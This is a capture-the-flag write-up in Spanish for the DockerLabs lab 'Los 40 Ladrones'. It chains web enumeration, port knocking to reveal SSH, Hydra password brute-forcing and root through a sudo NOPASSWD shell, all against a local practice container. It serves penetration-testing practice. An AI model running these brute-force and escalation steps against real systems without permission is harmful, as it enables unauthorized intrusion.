---
title: "DockerLabs - Los 40 Ladrones"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar port knocking para revelar el servicio SSH, fuerza bruta con Hydra y escalada de privilegios en Linux.

## Despliegue

```bash
bash auto_deploy.sh los40ladrones.tar
```

## Reconocimiento

Empezamos con un escaneo de puertos:

```bash
nmap -sCV -p- --min-rate 5000 172.17.0.2
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | http | Apache httpd (página por defecto) |

SSH no aparece abierto — está oculto detrás de port knocking.

## Enumeración web

El puerto 80 devuelve la página por defecto de Apache. Lanzamos gobuster para buscar archivos:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x txt,conf,html,bak -b 301,302,404 -t 40
```

Encontramos `/qdefense.txt` con el siguiente contenido:

```
Recuerda llama antes de entrar, no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

Dos datos clave: la secuencia de port knocking (**7000, 8000, 9000**) y el nombre de usuario `toctoc`.

## Port Knocking

Instalamos `knockd` y ejecutamos la secuencia:

```bash
knock 172.17.0.2 7000 8000 9000
```

Verificamos que SSH se ha abierto:

```bash
nmap -p 22 172.17.0.2
# 22/tcp open ssh
```

## Explotación — Fuerza bruta SSH

Con el usuario `toctoc` sacado del `qdefense.txt`, lanzamos Hydra contra SSH:

```bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 6 -f
```

> Nota: algunos knockd cierran el SSH tras un tiempo. Si Hydra da `Connection refused`, volver a hacer el knock y relanzar con `-R` para reanudar.

Resultado:

```
[22][ssh] host: 172.17.0.2  login: toctoc  password: kittycat
```

Accedemos:

```bash
ssh toctoc@172.17.0.2
# password: kittycat
```

## Escalada de privilegios

Comprobamos permisos sudo:

```bash
sudo -l
```

```
User toctoc may run the following commands:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

`/opt/bash` está permitido sin contraseña. Ejecutamos directamente:

```bash
sudo /opt/bash
whoami
# root
```

Acceso root conseguido.

## Flags

| Flag | Hash |
|------|------|
| user.txt | — (no había flag de usuario) |
| root.txt | — (el objetivo era escalar a root) |

## Resumen de la cadena

| Fase | Vector | Resultado |
|------|--------|-----------|
| 1 | Gobuster → `/qdefense.txt` | Secuencia de knock + usuario `toctoc` |
| 2 | Port knocking 7000→8000→9000 | SSH abierto |
| 3 | Hydra brute force SSH (`toctoc:kittycat`) | Acceso como toctoc |
| 4 | `sudo NOPASSWD /opt/bash` | root |
